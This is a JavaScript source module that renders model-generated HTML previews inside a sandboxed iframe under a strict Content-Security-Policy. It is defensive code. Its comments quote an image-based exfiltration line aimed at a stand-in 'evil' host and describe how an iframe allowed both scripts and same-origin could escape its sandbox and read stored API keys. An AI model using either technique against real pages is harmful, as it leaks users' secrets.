// Turning what a model wrote into something safe to look at.
//
// **This module does not sanitize, and will not pretend to.** No tag stripping, no attribute
// rewriting, no script removal. A hand-rolled sanitizer loses to mutation XSS and parser
// differentials, and shipping a weak one next to a strong sandbox invites someone to trust
// the weak one. The boundary here is the browser's own sandbox and CSP, and they are the
// only thing holding the line — so both are exported as single constants with exactly one
// place each they can be weakened.
//
// The one fact that sets the security bar: Strata's API keys live in `localStorage` on this
// origin, in plain text, on keys that carry direct billing. A frame that could reach this
// origin could read every one of them.

import { cssVariablesFrom } from './tokenExport';

/**
 * The sandbox, as one frozen string.
 *
 *   allow-scripts — included, and the only genuinely dangerous token here. A prototype whose
 *     buttons do nothing is not a prototype. Everything else on this list exists to contain it.
 *
 *   allow-same-origin — EXCLUDED, and this one is not a preference. With both tokens present
 *     the frame runs script in Strata's own origin: `localStorage.getItem('strata_llm_keys')`
 *     inside it would be Strata's real key store, and the frame could reach `parent.document`,
 *     find its own iframe, drop the sandbox attribute and reload itself unsandboxed. The two
 *     together are equivalent to no sandbox at all.
 *
 *   allow-forms, allow-popups, allow-popups-to-escape-sandbox, allow-modals,
 *   allow-top-navigation(-by-user-activation), allow-downloads — all excluded. A preview has
 *   no business submitting a form, opening a tab, escaping its own sandbox, locking the tab
 *   in an alert loop, navigating the user off Strata, or handing them a file.
 *
 * The consequence to be honest about: the frame's origin is the opaque `null` origin, so
 * `localStorage`, `sessionStorage` and `indexedDB` all THROW inside it. Generated code that
 * saves anything will fail on its first line, which is why the system prompt below says so.
 */
export const PREVIEW_SANDBOX = Object.freeze({ value: 'allow-scripts' }).value;

/** A page bigger than this is refused rather than cut down: truncated HTML is exactly the
 *  input that renders confidently and wrongly. */
export const MAX_PREVIEW_BYTES = 1024 * 1024;

const FONT_HOSTS = { css: 'https://fonts.googleapis.com', files: 'https://fonts.gstatic.com' };

/**
 * The policy, built rather than hardcoded so the one thing a user can widen — remote images —
 * is visible as a parameter instead of buried in a string.
 *
 * `connect-src 'none'` is the highest-value line: no fetch, no XHR, no WebSocket, no
 * sendBeacon. A generated script cannot phone home with anything it can see.
 *
 * `img-src` omits `https:` on purpose. `new Image().src = 'https://evil/?d=' + text` is a
 * real exfiltration channel that `connect-src` does not close. The cost is real too —
 * generated pages love remote placeholder images — so it is offered as a choice the user
 * makes rather than a default they are not told about.
 */
export function buildPreviewCsp({ allowRemoteImages = false } = {}) {
  return [
    "default-src 'none'",
    // 'unsafe-inline' lets the model's own <script> run — which the sandbox already governs.
    // What this still buys is that no EXTERNAL script can load: no CDN, no library we never
    // saw. 'unsafe-eval' is omitted, so eval and new Function are blocked too.
    "script-src 'unsafe-inline'",
    "style-src 'unsafe-inline' " + FONT_HOSTS.css,
    'font-src ' + FONT_HOSTS.files + ' data:',
    'img-src ' + (allowRemoteImages ? 'https: data: blob:' : 'data: blob:'),
    "connect-src 'none'",
    "form-action 'none'",
    "frame-src 'none'",
    "child-src 'none'",
    "object-src 'none'",
    "media-src 'none'",
    "base-uri 'none'",
  ].join('; ');
}

/**
 * What this renderer cannot promise. Exported as sentences so the panel prints them from
 * here rather than retyping them, the way figmaMcp exported its possibilities.
 */
export const PREVIEW_LIMITS = Object.freeze([
  'Strata does not check whether the page is good, correct, accessible, or actually uses your design system. It makes it safe to look at, and that is all.',
  'Nothing is sanitized. The page runs as the model wrote it, inside a box chosen so that it can.',
  'Strata cannot see inside the frame. If the page is broken it looks broken, and nothing is reported.',
  'A generated page can freeze this tab with an endless loop, and nothing here stops that.',
  'The preview cannot reach the network, store anything, or open a window — so generated code that fetches data or saves to localStorage will fail. That is the sandbox working, not a bug.',
  'Nothing is saved. Reloading the page loses every preview.',
]);

/** What the model is told. It lives here, beside the sandbox and the policy it restates, so
 *  the instructions and what is actually permitted cannot drift apart. */
export const FORGE_SYSTEM_PROMPT = [
  'You write a single, complete, self-contained HTML document and nothing else.',
  '',
  'Rules the page is rendered under — it runs in a sandboxed iframe with a strict Content-Security-Policy, so breaking any of these makes the page fail rather than degrade:',
  '- One document, in one ```html code block. No commentary outside it.',
  '- No external scripts, stylesheets or libraries of any kind. No CDN. Everything inline.',
  '- No fetch, XMLHttpRequest, WebSocket or any network call. They are blocked.',
  '- No localStorage, sessionStorage, cookies or indexedDB. They throw in this frame.',
  '- No alert, confirm or prompt. They do nothing here.',
  '- No eval or new Function.',
  '- Images: inline SVG or data: URIs only. Remote images may be blocked.',
  '- Inline <script> is allowed and encouraged for interactivity.',
  '',
  'Use the design system you are given. Its tokens are already injected as CSS custom properties, so write `var(--brand-color-primary)` rather than a hex value, and use the type, spacing and radius tokens the same way. Do not restate the token definitions; they are already in the document.',
].join('\n');

const looksLikeDocument = (t) => /<!doctype\s+html|<html[\s>]|<body[\s>]/i.test(t);
const looksLikeFragment = (t) => /<(div|section|main|header|article|form|table|ul)[\s>]/i.test(t);

/**
 * Pulls the document out of a reply.
 *
 * First match wins, and within the fenced cases the winner is the first block that looks
 * like a document rather than the first block outright — models routinely print a three-line
 * illustrative snippet before the real thing.
 *
 * @returns {{ok: boolean, html: string, source: 'fenced'|'bare'|'salvaged'|'none', note: string}}
 */
export function extractHtml(reply) {
  // A leading byte-order mark would sit outside <html> and push the parser into quirks.
  const BOM = String.fromCharCode(0xFEFF);
  const raw = String(reply || '');
  const text = raw.startsWith(BOM) ? raw.slice(1) : raw;
  if (!text.trim()) return { ok: false, html: '', source: 'none', note: 'The reply was empty.' };

  const fences = [...text.matchAll(/(?:```|~~~)[ \t]*([A-Za-z]*)[ \t]*\r?\n([\s\S]*?)(?:```|~~~)/g)]
    .map(m => ({ lang: (m[1] || '').toLowerCase(), body: m[2] }));

  const pick = (list) => list.find(f => looksLikeDocument(f.body))
    || list.slice().sort((a, b) => b.body.length - a.body.length)[0];

  const tagged = fences.filter(f => f.lang === 'html' || f.lang === 'htm');
  const chosen = tagged.length ? pick(tagged) : (fences.length ? pick(fences) : null);
  if (chosen && looksLikeDocument(chosen.body)) {
    return { ok: true, html: chosen.body.trim(), source: 'fenced', note: '' };
  }
  if (chosen && looksLikeFragment(chosen.body)) {
    return { ok: true, html: wrapFragment(chosen.body.trim()), source: 'salvaged', note: 'The reply held markup but not a whole document, so Strata wrapped it in one.' };
  }

  // A bare document, not fenced at all.
  const start = text.search(/<!doctype\s+html|<html[\s>]/i);
  if (start >= 0) {
    const close = text.toLowerCase().lastIndexOf('</html>');
    if (close > start) {
      return { ok: true, html: text.slice(start, close + 7).trim(), source: 'bare', note: '' };
    }
    // No closing tag: this is what a cut-off reply looks like from here.
    return {
      ok: true, html: text.slice(start).trim(), source: 'salvaged',
      note: 'The document has no closing </html>, so it was probably cut off. What there is renders as-is.',
    };
  }
  if (looksLikeFragment(text)) {
    return { ok: true, html: wrapFragment(text.trim()), source: 'salvaged', note: 'The reply held markup but not a whole document, so Strata wrapped it in one.' };
  }
  return { ok: false, html: '', source: 'none', note: 'The reply had no HTML document in it.' };
}

const wrapFragment = (body) =>
  '<!doctype html><html><head></head><body>' + body + '</body></html>';

/**
 * Assembles the document actually handed to the frame: the model's HTML, with this project's
 * tokens and the policy injected into its head.
 *
 * Parsed with DOMParser rather than spliced as a string. DOMParser executes nothing and
 * loads nothing, and it is the same parser the iframe will use — so the tree edited here is
 * the tree that renders. String-splicing after `<head>` fails on exactly the documents that
 * matter: no head at all, a head inside a comment, an attribute containing `>`.
 *
 * @returns {{ok: boolean, srcDoc: string, bytes: number, oversize: boolean,
 *   strippedRefresh: boolean, note: string}}
 */
export function buildPreviewDocument({ html, tokensMap, project, allowRemoteImages = false } = {}) {
  const source = String(html || '');
  const fail = (note) => ({ ok: false, srcDoc: '', bytes: 0, oversize: false, strippedRefresh: false, note });
  if (!source.trim()) return fail('There was no document to render.');

  const doc = new DOMParser().parseFromString(source, 'text/html');
  const head = doc.head || doc.createElement('head');
  if (!doc.head) doc.documentElement.insertBefore(head, doc.body);

  // A meta refresh is the declarative half of "the frame navigates itself somewhere real",
  // and it is the only half that can be closed cheaply. The scripted half cannot be, and
  // PREVIEW_LIMITS says so rather than implying otherwise.
  let strippedRefresh = false;
  head.querySelectorAll('meta[http-equiv]').forEach((m) => {
    if (String(m.getAttribute('http-equiv')).toLowerCase() === 'refresh') { m.remove(); strippedRefresh = true; }
  });

  const el = (tag, attrs = {}, text = '') => {
    const n = doc.createElement(tag);
    for (const k in attrs) n.setAttribute(k, attrs[k]);
    if (text) n.textContent = text;
    return n;
  };

  const families = fontFamiliesIn(tokensMap);
  const nodes = [
    el('meta', { charset: 'utf-8' }),
    // The policy has to be parsed before anything it governs, so it goes second, after the
    // charset only. If the model supplied its own, both apply — policies intersect, so a
    // model-supplied one can only tighten this. That is why it is left alone.
    el('meta', { 'http-equiv': 'Content-Security-Policy', content: buildPreviewCsp({ allowRemoteImages }) }),
    el('meta', { name: 'viewport', content: 'width=device-width, initial-scale=1' }),
    ...(families.length ? [el('link', {
      rel: 'stylesheet',
      href: FONT_HOSTS.css + '/css2?' + families.map(f => 'family=' + encodeURIComponent(f).replace(/%20/g, '+') + ':wght@400;500;600;700').join('&') + '&display=swap',
    })] : []),
    el('style', { id: 'strata-tokens' }, cssVariablesFrom(tokensMap || {}) + '\n' + RESET),
    el('title', {}, (project?.name || 'Preview') + ' — Forge preview'),
  ];
  for (let i = nodes.length - 1; i >= 0; i--) head.insertBefore(nodes[i], head.firstChild);

  const srcDoc = '<!doctype html>\n' + doc.documentElement.outerHTML;
  const bytes = new TextEncoder().encode(srcDoc).length;
  if (bytes > MAX_PREVIEW_BYTES) {
    return { ok: false, srcDoc: '', bytes, oversize: true, strippedRefresh, note: 'The page is larger than ' + Math.round(MAX_PREVIEW_BYTES / 1024) + 'KB, so Strata will not render it. Cutting it down to fit would render something the model did not write.' };
  }
  return { ok: true, srcDoc, bytes, oversize: false, strippedRefresh, note: '' };
}

/**
 * Deliberately almost nothing.
 *
 * This used to bind body's background, colour and font to the project's tokens. That reads
 * as helpful and is not: a system whose surface tokens are dark paints itself over a light
 * page the model wrote, and the page comes back unreadable with no clue why. The tokens are
 * declared in the document and the model is told to use them — imposing them on top of what
 * it wrote is a different thing, and the wrong one.
 */
const RESET = 'html, body { margin: 0; padding: 0; }';

/** The families the project's own type tokens name, so the preview does not silently fall
 *  back to Times New Roman for a design system whose subject is partly its typography. */
function fontFamiliesIn(tokensMap) {
  const out = new Set();
  for (const cat in tokensMap || {}) {
    if (!Array.isArray(tokensMap[cat])) continue;
    for (const t of tokensMap[cat]) {
      if (!/font-?family/i.test(String(t.type || ''))) continue;
      const first = String(t.value || '').split(',')[0].trim().replace(/^['"]|['"]$/g, '');
      if (first && !/^(system-ui|sans-serif|serif|monospace|ui-|-apple)/i.test(first)) out.add(first);
    }
  }
  return [...out].slice(0, 4);
}
